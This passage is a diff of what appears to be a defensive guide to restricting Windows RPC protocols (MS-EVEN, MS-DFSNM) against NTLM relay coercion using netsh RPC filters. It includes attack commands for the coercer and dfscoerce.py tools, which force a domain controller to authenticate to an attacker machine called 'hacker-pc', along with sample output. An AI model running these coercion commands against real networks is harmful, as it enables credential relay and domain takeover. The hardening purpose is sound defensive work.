@@ -500,7 +500,7 @@ add filter
 
 The [\[MS-EVEN\]: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f) with UUID [82273FDC-E32A-18C3-3F78-827929DC23EA](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/648145da-250e-4c1f-b8e4-8044c1bd4a20) is an older version of the [MS-EVEN6](#ms-even6-eventlog-remoting-protocol-version-60) protocol described above.
 
-The protocol is only exposed over the [\\PIPE\\eventlog](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/648145da-250e-4c1f-b8e4-8044c1bd4a20) named pipe on older operating systems and might be abused by malicious actors to initiate the NTLM relay attack:
+The protocol is only exposed over the `\PIPE\eventlog` named pipe and might be abused by malicious actors to initiate NTLM relay attacks:
 
 ```shell
 coercer coerce --username john --password 'Pa$$w0rd' --domain 'contoso.com' --target-ip 'dc01.contoso.com' --listener-ip hacker-pc --always-continue --filter-protocol-name MS-EVEN --filter-transport msrpc
@@ -532,15 +532,25 @@ add filter
 
 #### \[MS-DFSNM\]: Distributed File System (DFS): Namespace Management Protocol
 
-Restrict to Domain Admins
-
-Restrict [MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol
-Named pipe: \PIPE\netdfs
-Limit access to Domain Admins only.
+The [\[MS-DFSNM\]: Distributed File System (DFS): Namespace Management Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979) with UUID [4FC742E0-4A10-11CF-8273-00AA004AE673](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/af348786-37e1-47a7-90f9-25727c350c38) is exposed over the `\PIPE\netdfs` named pipe and is often abused to initiate NTLM relay attacks:
 
 ```shell
-python3 DFSCoerce/dfscoerce.py -u john -p 'Pa$$w0rd' -d contoso.com hacker-pc dc01
+python3 dfscoerce.py -u john -p 'Pa$$w0rd' -d contoso.com hacker-pc dc01
 ```
+
+```txt
+[-] Connecting to ncacn_np:dc01[\PIPE\netdfs]
+[+] Successfully bound!
+[-] Sending NetrDfsRemoveStdRoot!
+NetrDfsRemoveStdRoot
+ServerName:                      '10.213.0.100\x00'
+RootShare:                       'test\x00'
+ApiFlags:                        1
+
+DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+```
+
+The following sequence of `netsh.exe` commands will restrict MS-DFSNM connections to the members of the *Domain Admins* group:
 
 ```txt
 rpc filter
